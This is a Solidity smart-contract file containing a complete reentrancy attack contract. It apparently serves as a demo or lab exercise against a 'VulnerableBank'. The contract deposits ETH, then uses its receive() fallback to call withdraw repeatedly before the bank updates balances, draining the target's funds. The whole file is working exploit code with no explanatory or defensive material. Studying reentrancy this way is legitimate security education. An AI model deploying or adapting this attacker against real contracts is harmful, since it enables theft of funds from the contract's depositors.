// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVulnerableBank public bank;
    uint256 public attackAmount;

    uint256 public maxLoops = 10;
    uint256 public loops;

    constructor(address bankAddress) {
        bank = IVulnerableBank(bankAddress);
    }

    function setMaxLoops(uint256 _maxLoops) external {
        maxLoops = _maxLoops;
    }

    function attack() external payable {
        require(msg.value > 0, "need ETH");
        attackAmount = msg.value;
        loops = 0;

        bank.deposit{value: msg.value}();
        bank.withdraw(attackAmount);
    }
function attackerBalance() external view returns (uint256) {
    return address(this).balance;
}

    receive() external payable {
        // limit re-entrancy so we don't run out of gas / revert mid-loop
        if (address(bank).balance >= attackAmount && loops < maxLoops) {
            loops++;
            bank.withdraw(attackAmount);
        }
    }
}
